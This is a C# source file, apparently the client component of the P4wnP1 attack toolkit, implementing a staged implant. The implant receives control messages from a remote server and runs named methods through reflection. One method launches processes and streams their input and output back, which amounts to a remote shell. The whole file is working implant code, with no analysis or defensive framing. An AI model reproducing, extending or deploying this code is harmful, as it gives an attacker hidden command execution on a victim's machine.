using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace P4wnP1
{
    public class Client
    {
        // message types from CLIENT (powershell) to server (python)
        const UInt32 CTRL_MSG_FROM_CLIENT_RESERVED = 0;
        const UInt32 CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1;
        const UInt32 CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2;
        public const UInt32 CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3;
        const UInt32 CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4;
        const UInt32 CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5;

        // message types from server (python) to client (powershell)
        const UInt32 CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002;
        const UInt32 CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003;
        const UInt32 CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004;


        private TransportLayer tl;
        private Hashtable pending_method_calls;
        private Hashtable pending_client_processes;
        private bool running;

        public Client(TransportLayer tl)
        {
            this.tl = tl;
            this.pending_client_processes = Hashtable.Synchronized(new Hashtable());
            this.pending_method_calls = Hashtable.Synchronized(new Hashtable());

            this.running = true;
            
        }

        public void stop()
        {
            this.running = false;
        }

        public void SendControlMessage(UInt32 msg_type)
        {
            SendControlMessage(msg_type, null);
        }

        public void SendControlMessage(UInt32 msg_type, byte[] data)
        {
            List<byte> msg = Struct.packUInt32(msg_type);
            if (data != null) msg = Struct.packByteArray(data, msg);

            this.tl.WriteControlChannel(msg.ToArray());
        }

        public void run()
        {
            Channel control_channel = this.tl.GetChannel(0);
            List<UInt32> method_remove_list = new List<UInt32>();
            while (this.running)
            {
                this.tl.ProcessInSingle(false);

                /*
                 * read and process control channel data
                 */
                while (control_channel.hasPendingInData())
                {
                    List<byte> data = Struct.packByteArray(control_channel.read());

                    // extract control message type
                    UInt32 CtrlMessageType = Struct.extractUInt32(data);

                    switch (CtrlMessageType)
                    {
                        case CTRL_MSG_FROM_SERVER_RUN_METHOD:
                            ClientMethod new_method = new ClientMethod(data);
                            this.pending_method_calls[new_method.id] = new_method;

                            Console.WriteLine(String.Format("Received control message RUN_METHOD! Method ID: {0}, Method Name: {1}, Method Args: {2}", new_method.id, new_method.name, new_method.args));
                            break;

                        default:
                            String data_utf8 = Encoding.UTF8.GetString(data.ToArray());
                            Console.WriteLine(String.Format("Received unknown MESSAGE TYPE for control channel! MessageType: {0}, Data: {1}", CtrlMessageType, data_utf8));
                            break;
                    }
                }

                /*
                 * Handle running processes
                 */
                 //ToDO: Handle running processes


                /*
                 * Process running methods
                 */
                ICollection method_ids = this.pending_method_calls.Keys;
                foreach (UInt32 method_id in method_ids)
                {
                    if (this.pending_method_calls.ContainsKey(method_id)) //we have to recheck if the method still exists in every iteration
                    {
                        ClientMethod method = (ClientMethod) this.pending_method_calls[method_id];


                        //check if method has been started, do it if not
                        if (!method.started)
                        {
                            //find method implementation
                            MethodInfo method_implementation = this.GetType().GetMethod(method.name, BindingFlags.NonPublic | BindingFlags.Instance);
                            
                            if (method_implementation != null)
                            {
                                try
                                {
                                    byte[] method_result = (byte[])method_implementation.Invoke(this, new Object[] { method.args });
                                    method.setResult(method_result);
                                }
                                catch (ClientMethodException e)
                                {
                                    method.setError(String.Format("Method '{0}' throwed error:\n{1}", method.name, e.Message));
                                }
                                catch (Exception e)
                                {
                                    method.setError(String.Format("Method '{0}' found, but calling results in following exception:\n{1}", method.name, e.InnerException.Message));
                                    Console.WriteLine("Catch block of Method invocation");
                                }
                                
                            }
                            else
                            {
                                
                                method.setError(String.Format("Method '{0}' not found!", method.name));
                            }
                            
                        }

                        if (method.finished)
                        {
                            //Enqueue response and remove method from pending ones
                            byte[] response = method.createResponse();
                            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE, response);
                            //this.pending_method_calls.Remove(method_id);

                            //add method to remove list
                            method_remove_list.Add(method_id);
                        }

                    }
                }

                //remove finished methods
                foreach (UInt32 method_id in method_remove_list) this.pending_method_calls.Remove(method_id);

                /*
                 * send outbound data
                 */

                this.tl.ProcessOutSingle();
            }
        }

        private byte[] core_create_proc(byte[] args)
        {
            List<byte> data = new List<byte>(args);

            // first byte indicates if STDIN, STDOUT and STDERR should be streamed to channels
            bool use_channels = (Struct.extractByte(data) != 0);
            string proc_filename = Struct.extractNullTerminatedString(data);
            string proc_args = Struct.extractNullTerminatedString(data);

            ClientProcess proc = new ClientProcess(proc_filename, proc_args, use_channels);

            
            if (use_channels)
            {
                this.tl.AddChannel(proc.Ch_stdin);
                this.tl.AddChannel(proc.Ch_stdout);
                this.tl.AddChannel(proc.Ch_stderr);

                /*
                proc.Ch_stdin = this.tl.CreateChannel(Channel.Types.IN, Channel.Encodings.UTF8);
                proc.Ch_stdout = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                proc.Ch_stderr = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                */
            }
            

            //start process

            //generate method response
            List <byte> resp = Struct.packUInt32((UInt32) proc.Id);
            if (use_channels)
            {
                resp = Struct.packByte(1, resp);
                resp = Struct.packUInt32(proc.Ch_stdin.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stdout.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stderr.ID, resp);
            }
            else
            {
                resp = Struct.packByte(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
            }

            this.pending_client_processes.Add(proc.Id, proc);
            
            //throw new ClientMethodException(String.Format("Not implemented: Trying to start proc '{0}' with args: {1}", proc_filename, proc_args));
            return resp.ToArray();
        }

        private byte[] core_echo(byte[] args)
        {
            return args;
        }
    }
}
